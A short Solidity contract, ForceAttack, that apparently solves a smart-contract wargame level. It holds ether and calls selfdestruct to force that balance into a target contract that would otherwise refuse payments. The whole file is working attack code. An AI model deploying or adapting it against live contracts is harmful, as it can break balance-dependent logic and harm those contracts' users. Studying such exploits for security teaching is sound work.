// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;


contract ForceAttack {

    address payable public target;

    constructor(address payable _target) {
        target = _target;
    }
    function attack() external {
        selfdestruct(target);
    }

    receive() external payable {}
}